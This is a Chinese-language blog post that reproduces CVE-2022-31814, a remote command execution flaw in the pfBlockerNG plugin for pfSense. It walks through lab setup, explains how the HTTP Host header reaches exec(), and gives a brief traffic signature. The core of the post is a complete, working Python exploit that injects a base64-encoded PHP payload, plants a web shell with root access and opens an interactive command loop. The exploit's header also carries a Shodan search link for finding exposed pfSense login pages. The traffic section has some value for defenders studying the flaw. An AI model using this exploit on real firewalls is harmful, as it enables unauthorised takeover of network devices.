<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CVE-2022-31814pfsense远程命令执行漏洞复现与exp利用 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CVE-2022-31814pfsense远程命令执行漏洞复现与exp利用" />
<meta property="og:description" content="目录
前言
一、环境搭建
二、漏洞触发点原理分析
三、exp验证
四、攻击流量分析
总结
前言 pfBlockerNG是一个默认未安装的 pfSense 插件，它通常用于阻止来自整个国家或 IP 范围的入站连接。在pfBlockerNG &lt;= 2.1.4_26中发现了一个远程命令执行漏洞（CVE-2022-31814），该漏洞存在于用于记录和查询 DNSBL 数据的文件 /usr/local/www/pfblockerng/www/index.php中，使用 PHP 函数exec()作为查询代码，将不受信任的数据传递到命令中，用户可以构造HTTP请求的HOST字段来触发远程命令执行。
受影响实体
pfSense是一个基于FreeBSD操作系统开发的防火墙和路由器软件；
FreeBSD 是一种类UNIX操作系统；
pfBlockerNG是一个pfSense的插件（默认不安装），提供了广告、恶意内容和地理拦截功能。
受影响版本
pfSense 2.6.0 pfBlockerNG&lt;=2.1.4_26 一、环境搭建 1.从pfSense下载iso 2.6.0版本镜像文件。下载地址：Download pfSense Community Edition
2.新建虚拟机，选择FreeBSDm，添加第二网卡（因为配置防火墙需要两个网卡），导入下载好的镜像文件。
接收协议
之后一路默认，在选择文件系统时，选UFS文件系统格式。
之后一路OK，最后Reboot重启。
3.将WAN口映射到eth0，LAN口映射到eth1,然后根据提示配置IP地址、子网掩码、网关I，IPV6可以不用管。
配置好后LAN口为web访问地址
4.访问web主页，默认登录名密码为：admin/pfsense
5.进入主页，添加pfBlockerNG插件，插件版本只有3.2.0_4,先安装。
漏洞存在的插件版本是2.1.4_26，github上找到相应版本的集合包的zip格式并下载。
下载地址：pfsense/FreeBSD-ports: FreeBSD ports tree with pfSense changes (github.com)
将压缩包中的pfBlockerNG的index.php文件解压，因为漏洞触发点只在该文件中，所以不用全部解压。
6.将index.php上传到防火墙中。上传成功后会返回路径。
7.打开命令行，使新上传的文件覆盖之前的文件
mv /tmp/index.php /usr/local/www/pfblockerng/www/index.php
至此环境部署完毕
二、漏洞触发点原理分析 漏洞触发点：
//index.php // Query DNSBL Alias for Domain List. $query = str_replace(&#39;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/b0990daf7786a3579b00a162d08f18f5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-11T22:29:32+08:00" />
<meta property="article:modified_time" content="2023-05-11T22:29:32+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CVE-2022-31814pfsense远程命令执行漏洞复现与exp利用</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <blockquote> 
 <p></p> 
</blockquote> 
<div> 
 <p id="main-toc"><strong>目录</strong></p> 
 <p id="%E5%89%8D%E8%A8%80-toc" style="margin-left:0px;"><a href="#%E5%89%8D%E8%A8%80" rel="nofollow">前言</a></p> 
 <p id="%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-toc" style="margin-left:0px;"><a href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" rel="nofollow">一、环境搭建</a></p> 
 <p id="%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-toc" style="margin-left:0px;"><a href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90" rel="nofollow">二、漏洞触发点原理分析</a></p> 
 <p id="%E4%B8%89%E3%80%81exp%E9%AA%8C%E8%AF%81-toc" style="margin-left:0px;"><a href="#%E4%B8%89%E3%80%81exp%E9%AA%8C%E8%AF%81" rel="nofollow">三、exp验证</a></p> 
 <p id="%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-toc" style="margin-left:0px;"><a href="#%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90" rel="nofollow">四、攻击流量分析</a></p> 
 <p id="%E6%80%BB%E7%BB%93-toc" style="margin-left:0px;"><a href="#%E6%80%BB%E7%BB%93" rel="nofollow">总结</a></p> 
</div> 
<hr> 
<h2 id="%E5%89%8D%E8%A8%80"><a id="_7"></a>前言</h2> 
<p>        pfBlockerNG是一个默认未安装的 pfSense 插件，它通常用于阻止来自整个国家或 IP 范围的入站连接。在pfBlockerNG &lt;= 2.1.4_26中发现了一个远程命令执行漏洞（CVE-2022-31814），该漏洞存在于用于记录和查询 DNSBL 数据的文件 /usr/local/www/pfblockerng/www/index.php中，使用 PHP 函数exec()作为查询代码，将不受信任的数据传递到命令中，用户可以构造HTTP请求的HOST字段来触发远程命令执行。</p> 
<p><strong>受影响实体</strong></p> 
<p style="margin-left:.0001pt;text-align:left;">pfSense是一个基于FreeBSD操作系统开发的防火墙和路由器软件；</p> 
<p style="margin-left:.0001pt;text-align:left;">FreeBSD 是一种类UNIX操作系统；</p> 
<p style="margin-left:.0001pt;text-align:left;">pfBlockerNG是一个pfSense的插件（默认不安装），提供了广告、恶意内容和地理拦截功能。</p> 
<p style="margin-left:.0001pt;text-align:left;"><strong>受影响版本</strong></p> 
<ul><li style="text-align:left;">pfSense 2.6.0</li></ul> 
<ul><li style="text-align:left;">pfBlockerNG&lt;=2.1.4_26</li></ul> 
<hr> 
<p></p> 
<h2 id="%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><a id="pandas_16"></a>一、环境搭建</h2> 
<p>1.从pfSense下载iso 2.6.0版本镜像文件。下载地址：<a href="https://www.pfsense.org/download/" rel="nofollow" title="Download pfSense Community Edition">Download pfSense Community Edition</a></p> 
<p>2.新建虚拟机，选择FreeBSDm，添加第二网卡（因为配置防火墙需要两个网卡），导入下载好的镜像文件。</p> 
<p>接收协议</p> 
<p><img alt="" height="359" src="https://images2.imgbox.com/42/9f/nYlzMQB4_o.png" width="675"></p> 
<p>之后一路默认，在选择文件系统时，选UFS文件系统格式。</p> 
<p><img alt="" height="120" src="https://images2.imgbox.com/30/33/RiAiLFBK_o.png" width="676"></p> 
<p>之后一路OK，最后Reboot重启。</p> 
<p>3.将WAN口映射到eth0，LAN口映射到eth1,然后根据提示配置IP地址、子网掩码、网关I，IPV6可以不用管。</p> 
<p> 配置好后LAN口为web访问地址</p> 
<p><img alt="" height="237" src="https://images2.imgbox.com/ea/84/lGpj2c8M_o.png" width="555"></p> 
<p>4.访问web主页，默认登录名密码为：admin/pfsense</p> 
<p> <img alt="" height="298" src="https://images2.imgbox.com/44/c2/RbDyeJZr_o.png" width="552"></p> 
<p>5.进入主页，添加pfBlockerNG插件，插件版本只有3.2.0_4,先安装。</p> 
<p><img alt="" height="326" src="https://images2.imgbox.com/20/3f/DcmYimHj_o.png" width="552"></p> 
<p>漏洞存在的插件版本是2.1.4_26，github上找到相应版本的集合包的zip格式并下载。</p> 
<p>下载地址：<a href="https://github.com/pfsense/FreeBSD-ports/tags" title="pfsense/FreeBSD-ports: FreeBSD ports tree with pfSense changes (github.com)">pfsense/FreeBSD-ports: FreeBSD ports tree with pfSense changes (github.com)</a></p> 
<p> <img alt="" height="989" src="https://images2.imgbox.com/03/5c/M4NjGOmo_o.png" width="1200"></p> 
<p></p> 
<p>将压缩包中的pfBlockerNG的index.php文件解压，因为漏洞触发点只在该文件中，所以不用全部解压。</p> 
<p>6.将index.php上传到防火墙中。上传成功后会返回路径。</p> 
<p><img alt="" height="450" src="https://images2.imgbox.com/ae/5d/wdDhpPAg_o.png" width="552"></p> 
<p>7.打开命令行，使新上传的文件覆盖之前的文件</p> 
<p>mv /tmp/index.php /usr/local/www/pfblockerng/www/index.php</p> 
<p>至此环境部署完毕</p> 
<p></p> 
<h2 id="%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90">二、漏洞触发点原理分析</h2> 
<p style="margin-left:.0001pt;text-align:left;">漏洞触发点：</p> 
<pre><code class="language-php">//index.php
// Query DNSBL Alias for Domain List.
$query = str_replace('.', '\.', htmlspecialchars($_SERVER['HTTP_HOST']));

exec("/usr/bin/grep -l ' \"{$query} 60 IN A' /var/db/pfblockerng/dnsblalias/*", $match);</code></pre> 
<p>        在查询域名列表的DNSBL别名时，以$_SERVER['HTTP_HOST']参数对用户输入进行获取，由于未对用户输入进行限制，导致输入的所有内容都可以传入exec()函数。并执行系统命令：/usr/bin/grep -l ' "[用户可控] 60 IN A' /var/db/pfblockerng/dnsblalias/*</p> 
<pre><code class="language-bash">/usr/bin/grep  [可选参数]  ‘要匹配的字符串’  ‘文件路径’  </code></pre> 
<p style="margin-left:.0001pt;text-align:left;">        上述命令实现了在/var/db/pfblockerng/dnsblalias/目录中匹配用户输入，并输入匹配的文件名。</p> 
<p style="margin-left:.0001pt;text-align:left;">        替换上述命令中的用户可控内容，使用分号拼接命令。</p> 
<p>        默认情况下，pfsense没有安装“base64-d”二进制文件，  但python3.8安装了，因此可以编写和解码base64有效载荷，并将所有内容传输到php-cli二进制文件中。 </p> 
<blockquote> 
 <p style="margin-left:.0001pt;text-align:left;">/usr/bin/grep -l ' "' * ;<span style="background-color:#ffff00;"> echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKGV4ZWMoJF9HRVRbImMiXSkpOz8+</span><span style="background-color:#ffff00;">Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSgkYSk7Pz4</span><span style="background-color:#ffff00;">=' | python3.8 -m base64 -d | php ; ' 60 IN A'</span> /var/db/pfblockerng/dnsblalias/*</p> 
 <p style="margin-left:.0001pt;text-align:left;">#将php代码通过base64编码,然后使用python3.8解码，后通过管道传输到php中执行</p> 
</blockquote> 
<p>编码前php代码： </p> 
<blockquote> 
 <p> echo &lt;?$a=fopen("/usr/local/www/system_advanced_control.php","w") <strong>or</strong> <strong>die</strong>();$t='&lt;?php print(passthru( $_GET["c"]));?&gt;';fwrite($a,$t);fclose( $a);?&gt;<br> #在 /usr/local/www/system_advanced_control.php 中创建一个shell文件,并将$t参数写入该文件</p> 
</blockquote> 
<p>passthru()函数实现与python脚本交互： </p> 
<p>php端： </p> 
<blockquote> 
 <p style="margin-left:.0001pt;text-align:justify;"><em><span style="color:#646a73;">$path="python 脚本绝对路径/脚本文件名.py "; //注意：末尾要加一个空格，否则传参失败</span></em><br><em><span style="color:#646a73;">$params = "要传入python脚本的参数"; //传递给python脚本的入口参数</span></em><br><em><span style="color:#646a73;">passthru($path.$params." ".$params2);</span></em></p> 
</blockquote> 
<p>python端： </p> 
<blockquote> 
 <p style="margin-left:.0001pt;text-align:justify;"><em><span style="color:#646a73;">import sys</span></em><br><em><span style="color:#646a73;">params = sys.argv[1] #即为获取到的PHP传入python的接口参数</span></em></p> 
</blockquote> 
<p>构造Host请求头，在请求头中拼接创建shell文件system_advanced_control.php的命令。上传并调用shell文件，执行系统命令“id“用于验证漏洞是否存在。</p> 
<p></p> 
<h2 id="%E4%B8%89%E3%80%81exp%E9%AA%8C%E8%AF%81">三、exp验证</h2> 
<p>exp来源：<a href="https://www.exploit-db.com/exploits/51032" rel="nofollow" title="pfBlockerNG 2.1.4_26 - Remote Code Execution (RCE) - PHP webapps Exploit">pfBlockerNG 2.1.4_26 - Remote Code Execution (RCE) - PHP webapps Exploit</a></p> 
<pre><code class="language-python"># Exploit Title: pfBlockerNG 2.1.4_26 - Remote Code Execution (RCE)
# Shodan Results: https://www.shodan.io/search?query=http.title%3A%22pfSense+-+Login%22+%22Server%3A+nginx%22+%22Set-Cookie%3A+PHPSESSID%3D%22
# Date: 5th of September 2022
# Exploit Author: IHTeam
# Vendor Homepage: https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
# Software Link: https://github.com/pfsense/FreeBSD-ports/pull/1169
# Version: 2.1.4_26
# Tested on: pfSense 2.6.0
# CVE : CVE-2022-31814
# Original Advisory: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
 
#!/usr/bin/env python3
import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
parser = argparse.ArgumentParser(description="pfBlockerNG &lt;= 2.1.4_26 Unauth RCE")
parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: https://192.168.1.111:443/")
args = parser.parse_args()
 
url = args.url
shell_filename = "system_advanced_control.php"
 
def check_endpoint(url):
	response = requests.get('%s/pfblockerng/www/index.php' % (url), verify=False)
	if response.status_code == 200:
		print("[+] pfBlockerNG is installed")
	else:
		print("\n[-] pfBlockerNG not installed")
		sys.exit()
 
def upload_shell(url, shell_filename):
	payload = {"Host":"' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"}
	print("[/] Uploading shell...")
	response = requests.get('%s/pfblockerng/www/index.php' % (url), headers=payload, verify=False)
	time.sleep(2)
	response = requests.get('%s/system_advanced_control.php?c=id' % (url), verify=False)
	if ('uid=0(root) gid=0(wheel)' in str(response.content, 'utf-8')):
		print("[+] Upload succeeded")
	else:
		print("\n[-] Error uploading shell. Probably patched ", response.content)
		sys.exit()
 
def interactive_shell(url, shell_filename, cmd):
	response = requests.get('%s/system_advanced_control.php?c=%s' % (url, urllib.parse.quote(cmd, safe='')), verify=False)
	print(str(response.text)+"\n")
 
 
def delete_shell(url, shell_filename):
	delcmd = "rm /usr/local/www/system_advanced_control.php"
	response = requests.get('%s/system_advanced_control.php?c=%s' % (url, urllib.parse.quote(delcmd, safe='')), verify=False)
	print("\n[+] Shell deleted")
 
check_endpoint(url)
upload_shell(url, shell_filename)
try:
	while True:
		cmd = input("# ")
		interactive_shell(url, shell_filename, cmd)
except:
	delete_shell(url, shell_filename)
            </code></pre> 
<p>具体细节可根据个人需求调整。</p> 
<p> 运行方法：python poc.py --url  “目标地址”</p> 
<p><img alt="" height="136" src="https://images2.imgbox.com/0f/53/Yms1a0Uh_o.png" width="552"></p> 
<p style="margin-left:.0001pt;text-align:justify;">若目标执行成功会显示目标存在漏洞，并反弹shell，输入要执行的命令后显示返回结果。执行完成后会删除上传的shell文件。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90" style="margin-left:.0001pt;text-align:justify;">四、攻击流量分析</h2> 
<p>在poc脚本运行时，使用wireshark抓包。方法：tcpdump -i eth0 -w xxx.pcap</p> 
<p><img alt="" height="254" src="https://images2.imgbox.com/b5/0a/OOsQpd8O_o.png" width="552"></p> 
<p>可以看出该漏洞poc的流量特征为：HTTP GET请求的HOST字段包含查询内容，查询方法为：‘语句1；语句2；语句3’，可使用分号将命令拼接到查询内容中执行。</p> 
<p></p> 
<hr> 
<h2 id="%E6%80%BB%E7%BB%93"><a id="_45"></a>总结</h2> 
<p>本文简单介绍了CVE-2022-31814的原理、环境搭建及简单利用。在网络配置中可能会遇到问题，本着“生活就是解决各种疑难杂症”的思想，任何问题都能一一解决。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/dccf7520d84fc258bf6b097076b6f814/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Linux中.bashrc文件是什么？</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/89cf6a3ecc32995808f6efcddb683e69/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">关于linux检测服务端口连通性四种方法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>